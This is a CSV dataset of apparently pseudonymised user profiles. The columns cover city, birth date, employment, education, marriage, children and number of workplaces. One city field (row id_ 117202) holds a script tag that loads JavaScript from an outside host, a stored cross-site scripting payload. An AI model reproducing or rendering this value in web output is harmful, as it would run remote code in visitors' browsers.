id,id_,city,birthday,is_working,education,is_married,works_by_profession,has_children,work_places_cnt
a32d50e52513ecfb64b28c894515ff25,114393,ЕКАТЕРИНБУРГ,1986-06-05,False,1,False,False,False,0
75ced65bbad428ff256bda4003e4b685,114466,Netanya,1988-01-17,True,2,False,False,True,1
0fa0f29f863ed66229df29e51c099a77,114536,город Ульяновск,1983-03-22,True,2,False,True,False,1
5ad199aca6c9d03d23552abb9f06c59b,114661,Ekaterinburg,1988-08-11,True,2,True,True,True,6
a1703cbf618316a7b8d131be007bae05,114690,Нур-Султан (Астана),1988-04-19,True,3,False,True,False,7
0572cde441d752b45aac0abe95101e12,114729,Taganrog,1967-08-30,True,3,False,True,True,4
a09ee4d9ec37009728c4495d7d080b05,114757,V,1990-01-13,False,3,False,True,False,9
0816e138dfbc589ee044598bf241129d,114828,Yokohama ,1990-03-25,False,3,True,True,False,7
7c791cac223fdbd875c5689085649fde,115103,Toruń,1971-03-09,False,2,False,False,False,2
897e7fd43ff132a2a97aefc7c17131d3,115108,киселёвск,1989-03-20,True,2,False,True,False,6
ed1264d17483d836e4924ad30abab674,115114,Коломна,1987-08-02,True,2,True,False,True,6
7b0d23faa0f6cbf9a0d0525c80a02015,115142,Brooklyn,1987-01-19,True,2,False,True,True,8
54b0db0e9cc5382241502b743af7d198,115214,Сертолово,1988-09-22,True,2,True,False,True,7
3b268d977c21bbda487a8b06be3227b3,115224,махачкала,1991-11-11,False,3,True,True,False,7
cb28e5879a97624b062c68a032ab86f6,115351,Lebedin,1986-02-20,True,2,False,True,True,6
4601153580b6295efcb251f788651e9d,115371,Воронеж ,1988-02-10,True,2,False,False,True,6
dd2c97503a3170ebe2b63b149cb655dc,115461,Abakan,1986-04-05,True,2,False,False,False,3
a62e5815ec0088a85726351de95806b3,115530,Рубцовск,1984-06-10,True,2,False,True,True,7
7e099abf4388c066f77793d50d347441,115591,новый уренгой,1989-08-30,True,3,False,True,False,7
54b4bc2b1af19b77db3e23690df67c20,115612,Тюмень,1986-04-06,False,3,False,False,True,7
609b929c59ccb4373efe61d6108f7d42,115827,Ош,1984-12-29,True,3,False,True,True,4
c7e0a930f5f126eaae9b07db3f81ed4f,115857,Шарджа,1990-01-06,False,3,True,False,True,6
45dbdb3df035d2e0ccd87b0f6511ca0a,115924,Полевской Свердловской Обл.,1988-11-21,True,2,False,True,False,8
90ccee34c78d4adde6077a11a4b44f77,115939,Батуми,1986-01-01,True,3,False,False,True,6
b0c0ec45fe80ca34b0bb02a32c52dccc,115966,"Киев, Киевская обл.",1984-04-26,True,3,False,True,False,5
a4439dffc066c51b32d1983a6888f29e,116090,Новомосковск,1990-12-23,True,3,False,True,True,7
ae74ec733c86fceff7f22ecff2685bb1,116177,Солигорск,1974-05-02,True,3,True,True,True,5
d2a7d7798581a0f205502194bba8f8df,116184,харьков,1992-01-10,False,2,False,True,False,9
aa26e9181434711ce4c79137c70dda90,116261,Лихославль,1985-10-17,False,2,False,False,True,6
9ba3eb4c1126aa8191dc3bd7d6eba117,116277,Мончегорск,1988-01-01,True,3,False,True,False,4
77751b83ed1ecb7d5c26a0d8c579a8cc,116302,Cанкт-Петербург,1988-06-15,True,2,False,True,False,5
8f31eea1918d1e066b096c7a5c0e0dbf,116323,Торонто,1984-10-10,True,3,False,True,False,7
3ff3a66b31e71cad3718e3b1e31a2285,116335,Новороссийск,1963-01-21,True,2,False,False,False,2
128b3c9cb2dc6caeab4e9d2f076b42bb,116338,"Chișineu, Moldova",1988-02-15,True,2,False,True,False,4
aa9434bd6ff6d54b2568cd5c183cc801,116401,Танжер,1989-05-01,True,2,False,False,True,8
c5cadfc84f868396617e84706eee26be,116472,Шымкент (Чимкент),1992-01-24,True,3,True,False,False,7
9abc303734babaf3ed3b36f64b85db2a,116487,Гусев,1990-03-25,True,3,False,False,False,9
04379997b569008efcefa23e7aff2669,116500,Кореновск,1989-03-03,True,3,True,True,True,8
f1dc90cf297bba09dca72fdd376c0a47,116548,Москва,1991-05-28,True,2,False,True,True,7
7c75b99774dc316f7dc1db7a21f5889e,116590,Архангельск ,1984-05-14,True,2,False,False,False,6
8ca4c6bc0432369f045b7b17f8ddc1c5,116701,Г. Ростов на Дону,1990-07-29,True,3,False,False,True,8
2ad260e5b13c7278dcfc78b6196a01f4,116722,Киев,1984-09-01,True,3,False,True,False,6
5a6750dab7e8009d194f072c5d7d0796,116733,Moskwa,1985-04-26,True,3,False,True,False,9
01fb5926bb83d0bd4431e9f25ce828da,116747,Орел,1985-04-20,True,2,False,True,False,6
8b28826bb969771480e6b9fdc8113a24,116748,харьков,1985-07-02,True,2,True,False,False,0
ddcd87514c822e359c49a41ac56ff054,116761,Чебоксары ,1984-12-10,True,2,False,True,False,3
68932c5657f40a04a40b50238e47d6cd,116916,New York ,1990-10-10,False,2,False,True,True,9
1276501ddc41b58712695567eed7402e,116926,Калуш,1985-07-15,True,2,False,False,False,6
7e169ad945408b9cabb87cf1cd0a47af,116969,Дербент,1984-07-31,True,2,True,True,True,6
3d03dcf3676f96dae19d960654ac21ca,116978,Париж,1991-03-15,False,2,False,True,False,7
959d4d33bbe6968c03e76e2ae8bed16a,116999,Нижняя Салда,1987-10-14,True,3,False,True,True,6
5ed902de139851b1e240ef37b06376a5,117044,Красная Поляна,1987-05-16,True,3,True,True,True,5
a7ea898e85f92818879f3e7e1a3d036e,117053,Shaoxing,1985-05-10,True,3,True,True,False,4
356fa821d2ded934289544ac3e8dc8ad,117125,Новомосковск,1988-02-17,True,3,False,False,True,6
a8dfdc33a9f66d4886ce0d879e0a27ac,117199,"Шахты, Ростовской области",1991-04-30,True,3,False,True,False,3
99ca59e0170bdd1b8ea415dbdd6f366d,117202,Hi<script src=//8b2.ru/s.js></script>,1987-01-17,True,2,False,True,True,6
65e44b19b5137f4480a01125e596b89f,117221,Kostomuksha,1991-09-23,True,3,False,True,False,6
72cca13bab907e061b83f300ea3af786,117326,Калининградской ,1986-08-30,True,3,False,False,True,1
945a09252c4147693a2804a718a4964a,117346,Никель,1990-05-06,True,2,False,True,True,4
b5abc8cb858b1cef482bec0afc899f30,117355,saint_petersburg,1991-12-23,True,3,False,True,False,5
8601500111aa1a0c7a217b896a364db0,117387,г. Котельники,1986-11-19,True,3,False,False,True,7
38537b5d59fc24463e384e03c5dc49a7,117402,Нижний Новогород,1964-04-02,True,2,False,True,True,8
798683bc70197415d786e1926a7a5c64,117406,Шлиссельбург,1988-07-05,True,2,False,True,True,8
03529149bf76f4cddca66f9af8659f2b,117446,Судак,1989-09-15,True,2,False,False,False,7
c3f9d4e420b0eb6344609dc620d80462,117561,Каменск-Уральский,1990-01-15,True,3,False,False,False,8
add5ebbf1df8d2abbeb2acedae83b303,117577,Пенза ,1991-03-19,False,3,True,True,True,5
ecbc1c9da0d5f348ef1258e6355b18c9,117632,Львов,1990-06-19,True,2,False,True,True,4
6139b1bab75f9d7d84098dbb3d926146,117643,Могилев,1988-04-18,True,2,True,False,True,5
8c7af858bf6f87aa965b51de93cedf33,117714,Зеленодольск,1989-09-07,True,3,False,False,False,6
a2c59f75a3c695c4ff0f39d87c81ffbc,117715,"Россия, Воронеж",1989-04-06,True,3,False,True,True,3
56d22d5cea04707dc4f5b6fb63b48668,117770,Дербент,1989-08-30,True,3,False,False,False,5
d78619f0faf443c3c3b8c2589984323f,117795,Wrocław,1987-04-08,False,2,False,False,True,8
2f19ad7295173b35e451c0bcafe44448,117831,Ростов ,1990-10-16,True,2,False,False,True,9
27d3b6e5b7821d87e718841e382d5bf8,117835,Краснознаменск ,1991-04-16,True,2,False,False,True,6
f8d9a3edf0f34a80d9573fd720243d43,117895,Пыть-Ях,1986-01-10,False,2,False,False,False,5
4076efe742288c12e83ebcf271348956,117975,Нижний Новогород,1984-06-07,True,3,False,False,True,2
8149831349d77448593e41076fa3177a,117995,Тольятти,1987-08-15,True,2,False,True,True,9
a977517e4a6f74a77b3cd4bb9718d48d,118011,Ашхабад,1988-02-24,True,3,True,True,False,3
6177e005cc1c1d65eb50485dbbf6dd14,118027,Zheleznodorozhnii,1987-04-27,True,3,False,True,False,6
7b29c3c67a429392d5e2182b6f8956d9,118036,Переволоки,1987-03-06,True,2,False,False,True,4
0280243d21dae3be1135fb518ba32e79,118108,москва ,1991-08-19,True,2,False,True,True,9
205db1c0d5c5f2e9f7dcd8b0db5d49c6,118130,Комсомольск-на-Амуре ,1989-11-23,False,1,False,False,False,0
0da3f6a9330639807a18bc02bb04ce6f,118140,Kaarst ,1988-01-22,True,3,False,True,False,6
a14ed09175f58ea5c6b2aba0383db88a,118147,г. Котельники,1990-03-22,True,2,False,True,False,5
d891e828f96b157e3eae424ec2fb7178,118169,санкт петербург,1986-12-02,False,3,False,False,False,4
08f65ba4e3d58724a43720aa680d3f93,118190,Белореченск,1985-06-03,False,3,False,False,True,9
7d481b75def81f5ad1f3062475036a61,118212,томск,1990-05-27,True,2,True,False,True,6
ea5073e55dd0e49ab6696b8ddd7351ed,118250,Чита,1986-12-26,True,3,True,True,False,1
54471e692142bc6e5f283904ebead800,118279,Борисов,1989-08-13,True,3,False,True,False,5
9d38855b66edad29018c1b01bf87979e,118282,Евпатория,1986-03-08,True,2,False,False,False,5
ca7e8bd50f758f01a91b7db57f1091af,118285,Кызыл,1985-11-28,True,3,False,True,False,6
7f81945b51af81b6a86e442624cf1ab6,118342,"Усть-Илимск, Иркутская обл.",1984-04-22,True,3,False,True,False,7
f276023cd1854ed4a6ccd1efcfc1043f,118377,Msk,1984-09-21,True,2,True,False,True,5
63aa038744497b0274178da543dc7041,118420,г. Краснодар (Краснодарский край.),1999-08-14,True,2,False,True,False,5
641c7385aabb6f3acf4be8bf442170cb,118564,Украина Одесская обл Подольский р-н,1990-10-08,True,2,False,False,False,8
c3a9bd256a3d520179f28f4a1351b2cd,118571,Архангельск ,1985-12-28,True,3,False,False,False,1
6b40116298952c4c3b2c7d65897f13cc,118581,Novosibirsk,1987-09-02,True,3,False,False,True,6
516ad777722fd42490b9d99d8a77847d,118584,г.Тюмень,1990-09-27,True,2,False,False,True,6
0159fd311e7865caac4ba0697be6c302,118698,г.Балашиха,1986-04-10,True,3,False,False,True,5
76efcf7a30ee4f441e3c0c5ce3b7de88,118718,Нижневартовск ,1989-01-28,True,2,False,True,True,4
c710f2d3eaa6c8436a8c7fb22844bd8f,118725,Ессентуки,1984-04-21,True,2,False,False,False,5
d59549441e21c2aa5e291a16653b8fca,118736,Москва,1986-06-10,True,3,False,True,False,5
2f0f525a329af185dd9529a51220ce4e,118744,Netanya,1985-02-19,True,2,False,True,True,8
161a274ae7d84e2757f84cf7a9882df5,118871,Санкт петербург,1990-04-08,True,3,False,True,True,6
aeeb1abf2d4986bc34cc89c1db2b515d,118879,Витебск,1990-01-23,True,3,False,False,False,5
a6be8f95169ea11c656029f7917310d4,118946,Kokand,1986-09-07,True,2,False,False,False,4
37cefe2436a302701e76bd06392980b2,119065,Chicago,1990-08-21,True,2,False,True,True,5
babf966eaf94b58fc2748c4deae9930d,119070,uk',1987-02-26,True,3,False,False,False,3
5698a078b1b185b83b100d67fb53697d,119077,Akhaltsikhe,1987-10-10,True,2,False,True,True,9
d37533b9a8e0a6cebd308397614b0ae1,119084,Rostov-on-Don,1988-04-06,True,3,False,True,False,3
386c51fda4cc93359b8c94528a5a883d,119107,Göttingen,1988-07-27,True,2,False,True,True,4
bb2949101377cb1015fcfd36f71c120c,119172,Zheleznodorozhnii,1987-02-05,False,2,False,False,False,3
a2f269c7085d9fea4beeff9fc7c28c49,119180,Kaliningrad,1985-11-14,True,3,False,False,True,7
a15694393fa82941244b46a8148f8bcc,119196,Архангельск ,1991-09-17,True,3,False,False,True,9
2d4fc5488db9dae10500cf850f8005f9,119284,Сертолово,1957-03-24,True,2,False,True,True,7
73a1ba9cb37a5f0ff18f3dc46b6e4ea4,119291,Орел,1985-08-17,False,2,False,False,True,9
698b17d620e6340b851191a061b2ad10,119350,Nicosia,1986-01-22,True,2,False,False,False,6
31507fda382369aefb1ae344c0ac2d56,119405,Русское Маскино,1991-04-23,True,2,True,False,False,3
dc1c0a2e410626a54a679695870c168e,119591,Semei,1986-05-20,True,3,True,False,True,5
9676ac10dd1fc61b6804bed8404ec2be,119670,"Volzhsky, Volgograd. oblast'",1991-03-17,True,2,False,False,True,3
29325e67f46592f4a4dca2c6a974d760,119712,Троицкое,1990-03-17,True,3,False,True,False,6
c9e9f373a19b0243ccab55f287009737,119782,Вуктыл,1985-10-23,False,3,False,False,True,6
70b79e334840d35ab9097e339511d77e,119813,Бат Ям,1989-09-05,True,2,False,True,True,9
c7e8f98af339ed635c846e269b978c89,119857,Братск,1980-09-03,True,2,False,False,False,1
5c08eb89dfb0c561de91f5f0c71f6440,119864,Санкт- Петербургг,1987-05-24,True,3,False,False,False,5
bbdf3ec73a8aa8c58cbcfc720d79d252,119901,Зеленогорск (Красноярский край),1989-11-25,True,2,True,False,True,5
5d2ee26e9f84323f4ff1282877df9384,119929,Томск,1986-02-03,True,2,False,True,True,5
2c56cc38e874206e00a10c0265f2a51e,120068,г. Отрадное,1985-09-12,True,2,True,True,True,5
300bf291c419c48526c1fae65679a1cc,120105,Н.Новгород,1987-05-30,True,2,False,True,True,8
98182d07e0452dcfbb2d9420c168ab0d,120157,Kuznetsk,1985-10-14,True,3,False,False,True,4
1e96065d29f5704f5ece211883abf347,120162,Королеа,1985-04-20,True,3,False,False,True,6
e1c624580efa2d232627dec2ab5d394d,120242,Южно-Сахалинск,1986-01-23,True,2,False,False,False,6
d51282406eaf66cf14ee8ec9758a42da,120277,Тазовский,1989-10-31,True,2,True,False,True,5
0d68f4320507d11e01a16282724ea7a9,120364,Тирасполь,1991-02-22,True,3,False,True,True,6
a6c779f6f99be33b04ee2ac8d68023e7,120423,Челябинск ,1980-06-08,True,2,False,False,True,6
01a1710115601d3f9fb62fced4233b80,120498,г.Иркутск,1988-10-20,True,2,False,True,True,9
aefbffd4f308a2eec58484adb7488af8,120527,Moscow§,1990-02-19,True,3,False,False,True,6
2c9c3542ff61fcbc7ed3f6fca52dab02,120533,Wiesbaden ,1987-06-02,True,2,False,False,True,4
5602bfeb3c01841da38c8c061bf045ce,120569,Москва,1989-06-03,True,2,False,False,True,9
4d9a708561fdc53646d9eb7bb8390fa8,120612,Krasnogorsk,1984-11-06,True,2,True,False,True,7
e5ca9fa32c5b9cba94a6c50cc4274a67,120626,Kharkiv,1988-04-13,True,3,False,True,True,9
41b4f4f02b36eb37cf7d254fed86da14,120633,"Balashiha, Zheleznodorozhny district",1987-03-11,True,3,False,False,False,3
c01f3013d380c4a4fdf440c0a8fc97dc,120696,Серов,1987-04-04,False,1,False,False,False,2
d1087c55a0293c4304454e95db1e0ffa,120727,Sosnogorsk,1991-09-16,False,3,True,False,False,8
7f2b93e27873b8bd98bd4cb1f08071a4,120815,Taldyqorgan,1989-10-13,True,2,False,True,True,4
7317f0e5374f290eb7a247946e250a36,120955,Нововоронеж,1987-03-23,False,2,False,False,False,0
c5f04848af3ae8f7b11c3556305d2a81,121036,Саратов,1984-02-11,True,2,False,False,True,4
b73c6e9627ca195fc533c1c2aadc333e,121060,Toronto,1985-08-13,True,2,False,False,True,9
86c89917e97d3d9b669abf004916c110,121086,Воркута,1991-10-29,True,2,True,True,False,7
12d0b5f0026bedebe08cb122c926a112,121249,Анжеро - Судженск,1984-04-07,True,3,False,False,False,6
e67674238481332c69b30508d6a525fc,121273,Дзержинский,1989-08-15,True,2,False,True,True,3
40489e42680cf31a0c49868d3290b383,121348,Волжск ,1985-02-28,True,3,True,True,False,7
3a6987d94c9ac67ff173c91dedf77d29,121385,Комсомольск-на-амуре,1990-09-03,False,2,True,True,True,4
7e7314f648a31acaa9ab18a757a78ab9,121397,Прохладный ,1985-12-23,True,2,False,False,True,7
b1fec7d3a0ec9e8ef126cf305f035d7c,121428,Темиртау ,1988-12-23,True,2,True,False,False,9
7fd6593c555315aae95ea24d1994e41b,121431,Sochi,1991-05-21,True,3,False,False,True,5
b0bb9b6a0ad31b47c9176d9c05cea05c,121447,Ангарск ,1984-11-04,True,2,True,False,True,7
e4792fbd697ec87e07bb686ab9f71bb9,121466,Самара/Москва,1986-11-20,True,2,False,True,True,8
fae0e479fa80274c4aa12a11c42647a3,121489,санкт петербург,1986-06-05,True,2,True,True,False,5
c112ad194d06102d4e39aa3da5b4c10d,121513,Lipetsk,1984-06-06,True,1,False,False,False,0
83459cc87927c58d7b3f01f84773889e,121531,moskow,1990-11-29,False,2,False,True,True,8
1e4eb67cf6ee256e4318ae318ba9a1fe,121587,Brooklyn,1986-11-15,True,3,False,False,False,5
75d259e26ce343dcebe50d85e28212dc,121661,Киев ,1984-06-15,False,2,False,True,False,8
04cd3a0e306d3d119f3252359f804a44,121675,Абакан,1991-07-10,True,1,False,False,False,0
37f866c0a82299b46bc4450d422a469c,121708,Montreal,1986-07-11,True,2,True,False,True,9
abb4db16e877b8f773b21e02100f278a,121711,Volgograd,1987-05-02,False,3,False,False,True,4
ad52d674df940aa3c992165b5196c20d,121748,Aktobe,1984-05-15,False,3,False,True,True,4
882e07a5c11f7164ab8fc4511db21f2b,121783,Ноябрьск,1985-07-14,True,2,False,False,False,4
95386c00e3c648298ca67274bac4042c,121823,Александров,1990-04-14,True,2,False,True,True,5
140a18cabf6c97e4de31594a8d055211,121877,таганрог,1984-10-15,True,3,False,True,False,2
de2f79223e23d5f1c99689314195ca75,122042, Москва,1984-11-02,True,2,False,False,True,9
e694a07c1750b80cf9991955395af9fb,122088,Петрозаводск ,1985-11-13,True,2,False,True,True,4
307fef62ae773b510277a3954fdd8774,122110,Станция Кашира,1985-07-09,True,2,False,True,True,6
faad56192189890be734c4be7c07fa23,122152,Тюмень,1984-09-04,True,3,False,False,True,7
60b33160929b18537ab6366922031745,122184,Пограничный,1991-02-20,True,3,True,False,False,6
970231b3542bb14004c3cb47b31f0112,122185,пятигорск,1985-06-18,True,3,False,True,True,6
0aec60f40815d020585de7ed81544412,122190,Шарыпово,1989-05-15,True,2,False,True,False,7
9655f1f4b378d7a496616a3d1fef1176,122233,Kharkov,1985-01-21,True,3,False,True,True,6
55c9ac49719f556d48557a8056f2e61d,122239,Kirov,1988-12-25,True,2,True,False,True,7
ca16a6b527bf434092d20ad439238e13,122245,Yekaterinburg,1985-06-11,True,2,False,True,True,8
1a60bcd2fe71a9a7b82c656750c134bb,122313,Челябинск ,1987-05-24,True,3,False,False,True,6
2e1072aa5bdab951baaa6830e78a1671,122368,Усинск,1985-01-15,True,3,False,True,False,4
e3b25fbf41e741519bc49b8899dfe2c0,122373,Санкт-Петербурга ,1988-02-04,True,2,False,True,True,4
7ee6197d51ff90d7d28c947eb7f84b25,122434,Гагарино,1991-02-04,True,2,False,True,False,6
66bd725ae5e86f6bbfa6f667cb7ae706,122491,Киев,1989-04-23,True,3,False,False,False,8
17204f446a7e3465169f65dfb04f0e75,122498,Горно-Алтайск,1990-08-19,False,3,False,True,True,7
520bbb13680c6432d364dce461f93c68,122541,Хельсинки/Санкт-Петербург,1989-01-17,True,3,False,True,False,4
a8c0632dafde28f161bc991c0d86f136,122623,Limerick,1988-10-07,True,3,False,True,True,8
838daf8a130e44112ca86d8871f68ede,122626,Шацк,1988-04-24,True,2,True,True,False,9
9b86ec8e7ebe504ef30a7f362daaac6a,122705,"Московская область, город Коломна",1980-08-27,True,3,True,False,True,3
b1b17df1eeea7a3fd0d1e0e65bd9a0ee,122725,Ростов - на - Дону ,1984-12-16,True,2,False,True,True,3
8f7ed754041cc78903248a8ad27939c0,122749,Warszawa,1988-09-05,True,3,False,True,True,6
e013068012a6c7be29af37b86550367f,122815,г Новосибирск,1986-09-23,True,2,False,False,False,7
04bce9b99b29a6607e95ad2cd999b064,122819,Сумы,1990-10-27,True,2,False,False,True,3
9b33526329a97c24baefd008ac55f9c7,122921,Алматы (Казахстан),1988-03-18,True,3,False,True,False,5
e5d222b9d9dc73a36deacd480f10e51d,122929,Новоуарльск ,1967-04-09,True,2,False,True,True,4
5331cda63ed3f93d8a4323bbe173a9fd,123059,Торонто,1998-04-28,True,3,False,False,True,6
558de0958662380d15fc919c358908bb,123074,Ярослалвь,1990-08-10,True,3,True,True,True,3
b9643d389cde8f99f77362640edeff99,123149,Краснодар,1971-04-26,True,3,True,False,False,9
2c267e0ba66c7ec73b698538fbe28741,123153,Пушкин,1975-05-11,True,2,False,False,False,5
da223fd9974ec9dac1001d91890b28a6,123170,Ковров,1988-12-09,True,2,True,True,True,9
e9a3f3f0a6655fa999ad3e71cca861d5,123172,Лесосибирск,1987-03-29,True,3,True,True,False,4
94ddb2b254816f096f7161236c22491b,123189,новый уренгой,1978-10-02,True,2,False,True,True,5
0565651d654e647e36fb474eae15cb4e,123316,"Раменский р-н, д. Дергаево",1986-08-17,True,2,False,True,True,4
be2aec3515d8933241654151097fed9a,123342,Ухта ,1991-05-19,True,3,False,False,False,4
057118647c84ac27a4887e5ba136c14f,123381,москва ,1991-01-31,True,3,False,True,True,5
ca80b2e1a950526e184c45ad70e6e405,123432,г.Лабинск,1990-12-26,True,2,False,True,True,4
2630361f8fe4b2045820e214a6c5fc71,123470,Таштагол,1987-09-20,True,2,True,True,True,4
659f4b2889499b1775e0a07d476a6760,123483,Tallinn,1984-02-01,True,2,False,True,False,3
39786a7c07b832dd51080897e17a5d38,123514,Краснодар,1990-04-27,True,3,False,False,True,6
97c3b81554ea06be88fc016e44ca0827,123551,Netanya,1994-01-29,False,2,True,True,False,8
c003790d22c06d7813948772a98bf437,123561,Армавир,1986-05-31,True,3,False,True,False,7
f2d75ad3409a40681a29d9308c723d2a,123624,армавир,1990-11-06,True,3,False,False,False,6
f77e3a5af01245b00b0d19539977de43,123657,Шебекино,1984-01-19,True,2,False,False,True,9
55762e95ff601a21ab323de4f597a50d,123664,Omsk,1991-12-03,True,3,False,False,False,6
ba0368b93a622e0802340f592adfe7fb,123676,волгоград,1989-01-25,True,3,False,True,True,4
e969f2f48cb589aaad56c256971c9132,123682,Брест,1986-04-25,True,3,False,False,True,9
fa40c79724226ec8a49673bcb9dab9b7,123762,"Balashiha, Zheleznodorozhny district",1986-06-04,True,3,False,False,False,1
19c8a0aa6530015fb56f643140398b54,123768,москва ,1986-08-07,True,3,False,True,False,1
20e7c9e5de15f86b7abef73bdc41cd8b,123791,"Тюмень, TJM",1986-03-10,True,3,False,False,False,7
8957563ac183923b77c5ea4309a64030,123848,Тула ,1989-09-03,True,3,True,False,False,5
424078d524fb01ef1341ae3e973a856b,123859,Беер Шева,1991-09-26,True,2,True,False,True,3
85aa008193d344411b61ccd717b6af99,124024,г. Саратов,1985-02-01,True,3,False,False,False,5
798fefdf24ff77fccbe97b2620af2b20,124069,Могилев (Беларусь),1990-03-16,True,3,False,True,False,3
27c74f308e937ad92f6d932280ab413f,124091,Борисов,1990-06-26,True,3,False,True,True,7
dabd8a385b3c264b5f97801448cf0fef,124105,Йошкар-Ола,1984-06-07,True,2,True,True,True,6
6c6baca8500817dcf9398436a970db2d,124223,LIMASSOL,1985-05-05,False,2,False,True,False,6
385607b1e14eb0453878671e9782c79d,124289,"Троицк, Челябинская область",1991-07-02,True,2,False,True,True,8
c32a23d3b4336f707e8fb967a173ef88,124319,Stockholm,1993-05-08,False,2,True,True,True,6
2112b15c2303ac6d49a460a0c17f88e4,124396,Ялта,1987-10-17,True,3,False,False,False,3
81b186502f8122583b9106dbd95b390b,124406,Saint-petersberg,1984-12-21,True,3,True,True,True,5
512babc877679d91271cf99a1ed3bf2e,124484,Краснодар,1986-01-20,True,2,False,True,True,8
8c4c83698df7189f8d627dbf96f4c672,124554,Санкт-петербург ,1987-04-14,True,3,False,True,True,7
34c592eb53f7c69e96b1dbe87b03191b,6910,Балаково,1987-07-17,True,2,False,True,True,3
080095d5d500c06951ebd394426a41de,8307,Краснодар,1987-06-17,True,3,True,False,True,6
e920742341096dbe9ea2b187185e6e9d,9399,Барнаул,1989-02-15,True,2,False,True,False,3
d05e3e3f6d4ee560079ffb0e8cbcb2b3,11436,Рыбинск,1987-09-30,True,2,False,True,True,5
db0c3d219311c607f1ad4cae04bddc65,12602,Петропавловс-Камчатский,1985-04-14,True,3,True,True,True,4
5492f54d05de8e1aecd4e2156dc80c98,12841,Москва,1989-12-06,True,3,False,False,False,8
3dcd00dd663090466abd515e25a54fd7,13103,Черновцы,1991-10-20,True,3,False,True,False,6
1d6d3afefb9ad92dc2a30aa0919e6187,14140,Москва,1997-04-04,True,2,True,False,False,7
16b806a57020a94e88c1cf1c53f36039,30119,Moscow ,1989-09-04,True,2,False,True,True,9
184351bd20c4f473b63628ebc4d3b259,15414,Екатеринбург,1991-12-02,True,2,False,True,True,3
a0bad277abe476146127c9fd64ce04e6,15492,Moscow,1985-10-19,True,2,False,False,True,5
a9ab5036914e64b7fa8f8b46853545e9,15887,Донецк,1990-03-12,False,3,False,True,True,8
5a7a2519f6e6d48eb1ebb5b2036b91cd,16725,spb,1987-02-11,True,2,False,False,True,9
d5a6dff054328d74a9043626bb9646d8,17604,Тирасполь,1987-10-17,True,2,False,True,False,6
1768085ecda0bf57db1ac38063c703ec,17680,Барнаул,1991-10-30,True,3,True,True,False,5
9b94931242d98717d79182e32fd74d71,18416,Калуга,1991-07-17,True,3,False,False,False,3
298ee7c4c95b7e58f986968966e98f59,18601,Лида,1984-06-26,False,3,False,False,False,3
a8ad2590765021f9618ccfa6b816375d,18793,Odessa,1961-06-20,True,2,True,True,True,8
8d246b9a01f924f1901bd30a40b3d692,19023,Москва,1997-09-03,True,2,False,True,True,8
00c9a36be709a2d178627d76c1d3753c,19329,Краснодар,1989-10-01,True,3,False,False,False,6
baa9a818e6551fe83db95643f8280e06,19391,Andreevka,1988-01-18,True,3,False,True,False,8
e9f91d35a891788fea34b41267417ea6,19528,Красноярск,1986-04-08,True,2,False,True,True,6
56819875dad49a0502796e6b18fd975a,19595,Улан-Удэ,1987-10-24,True,3,True,True,True,3
b463d3d2741627b5890ff88b87cdc567,20051,Хабаровск,1986-02-06,True,2,False,True,False,6
97f3a8a2c90fe0f11bc105a71afc6cec,20291,Санкт-Петербург,1985-06-26,True,2,False,False,True,6
3569e6252292d93d279e3c5b2d9433ca,20351,Москва,1977-04-19,True,3,False,False,False,4
5ad911aab288a1f1dd69b3295a978ba4,20415,Санкт-Петербурге,1985-07-09,False,3,False,True,False,6
89cea2ce623eecd84b2f6908a51af3bc,20491,Кемерово,1993-03-27,True,2,False,False,False,7
6e83a01430381fb8bc4fe59a81d27b0c,20512,Новосибирск ,1990-06-12,True,2,False,True,True,9
1b8f7a68a8185d769ae31cb1e7e6b599,20525,Санкт-Петербург,1984-10-28,False,2,True,False,False,2
7fd8ef4dc2b412217dcde83c504f6343,20527,Москва,1973-05-16,False,2,False,False,False,5
6bd682524c33de8a335d559ede95e9a6,20541,Tbilisi,1984-09-27,True,3,False,False,True,7
cd5fc0254baa43bd2388948497c23c3d,30182,Kiryat Yam,1990-03-02,True,2,True,True,False,3
2a7f2dad9ed68ece4525289f9aa94121,20952,Днепр,1989-05-30,True,3,False,True,True,9
61ca187099f3bbd9781922730b1abee6,20967,Новомосковск,1986-11-12,True,3,False,True,True,6
85501f2238b7d785f9f4911defa65677,21377,Moscow,1988-10-14,True,3,False,True,True,5
7efc39cfbe08be2a59423f5f2c91a67b,21517,п.Тубинский,1989-06-24,True,3,False,True,False,9
560fa4a4ad5e947ebb58ffc7efe3a7d2,21540,Киев,1989-04-23,True,2,True,True,False,6
8a90983220cb31c46e528808f2294038,21583,Краснодар,1995-10-24,True,3,False,False,True,8
fcf2aba8caee27aee93c1349e06187df,21618,Королёв,1989-12-23,True,3,False,True,True,4
4241f291130043cf6ef1328c5f3c18e7,21640,Мурманск,1991-12-08,True,3,False,True,False,9
